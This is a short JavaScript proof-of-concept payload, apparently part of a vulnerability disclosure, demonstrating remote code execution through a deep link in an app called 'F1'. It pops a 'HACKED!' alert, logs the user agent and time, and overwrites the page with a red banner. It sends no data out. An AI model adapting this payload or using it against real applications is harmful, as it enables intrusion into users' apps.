// F1 PoC - Remote Code Execution via Deep Link
console.log("🚨 REMOTE JS EXECUTED!");
alert("HACKED! Remote JavaScript Execution via Deep Link!");

const info = {
  time: new Date().toISOString(),
  userAgent: navigator.userAgent,
  source: "GitHub RCE PoC"
};

console.log("Execution Info:", info);

if (typeof document !== 'undefined') {
  document.body.innerHTML = `
    <div style="background:red;color:white;padding:20px;text-align:center;font-family:monospace;height:100vh;display:flex;flex-direction:column;justify-content:center;">
      <h1>⚠️ REMOTE CODE EXECUTION</h1>
      <p>Payload hosted on: GitHub</p>
      <p>Delivered via: F1 Deep Link</p>
      <p>Timestamp: ${info.time}</p>
      <p style="background:black;padding:10px;margin:10px 0;border-radius:5px;">
        This JavaScript was loaded remotely without app verification
      </p>
      <p style="font-size:12px;">F1 Vulnerability Proof of Concept</p>
    </div>
  `;
}
